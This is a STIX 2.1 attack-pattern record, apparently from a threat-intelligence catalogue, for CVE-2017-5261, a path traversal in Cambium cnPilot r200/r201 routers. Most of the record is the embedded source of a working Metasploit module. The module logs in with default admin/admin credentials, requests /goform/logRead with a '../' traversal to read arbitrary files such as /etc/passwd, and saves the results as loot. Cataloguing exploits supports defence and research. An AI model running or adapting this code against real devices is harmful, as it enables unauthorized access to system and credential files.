{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57458c32-2af4-4b60-bd69-0c6e1aa84ccb",
    "created": "2024-08-14T16:24:02.054814Z",
    "modified": "2024-08-14T16:24:02.054819Z",
    "name": "Cambium cnPilot r200/r201 File Path Traversal",
    "description": " This module exploits a File Path Traversal vulnerability in Cambium cnPilot r200/r201 to read arbitrary files off the file system. Affected versions - 4.3.3-R4 and prior. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/cnpilot_r_fpt.rb",
            "external_id": "cnpilot_r_fpt.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5261"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::CNPILOT\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cambium cnPilot r200/r201 File Path Traversal',\n        'Description' => %q{\n          This module exploits a File Path Traversal vulnerability in Cambium\n          cnPilot r200/r201 to read arbitrary files off the file system. Affected\n          versions - 4.3.3-R4 and prior.\n        },\n        'Author' => [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n        'References' => [\n          ['CVE', '2017-5261'],\n          ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']\n        ],\n        'License' => MSF_LICENSE\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('TIMEOUT', [true, 'HTTP connection timeout', 10]),\n        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.\n        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),\n        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'admin']),\n        OptString.new('FILENAME', [true, 'Filename to read', '/etc/passwd'])\n      ], self.class\n    )\n\n    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')\n  end\n\n  def run_host(_ip)\n    unless is_app_cnpilot?\n      return\n    end\n  end\n\n  #\n  # Read file\n  #\n\n  def read_file(the_cookie)\n    print_status(\"#{rhost}:#{rport} - Accessing the file...\")\n    file = datastore['FILENAME']\n    fileuri = \"/goform/logRead?Readfile=../../../../../../..#{file}\"\n    final_url = (ssl ? 'https' : 'http').to_s + '://' + \"#{rhost}:#{rport}\" + fileuri.to_s\n\n    res = send_request_cgi(\n      {\n        'uri' => fileuri,\n        'method' => 'GET',\n        'cookie' => the_cookie,\n        'headers' => {\n          'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'\n        }\n      }\n    )\n\n    if res && res.code == 200\n      results = res.body\n\n      if results.empty?\n        print_status('File not found.')\n      else\n        print_good(results.to_s)\n\n        # w00t we got l00t\n        loot_name = 'fpt-log'\n        loot_type = 'text/plain'\n        loot_desc = 'Cambium cnPilot File Path Traversal Results'\n        data = results.to_s\n        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc)\n        print_good(\"File saved in: #{p}\")\n      end\n    else\n      print_error(\"#{rhost}:#{rport} - Could not read file. You can manually check by accessing #{final_url}.\")\n      return\n    end\n  end\n\n  #\n  # Login & initiate file read\n  #\n\n  def run_login\n    cookie, _version = do_login(datastore['USERNAME'], datastore['PASSWORD'])\n    if cookie == 'skip'\n      return\n    else\n      read_file(cookie)\n    end\n  end\nend\n"
}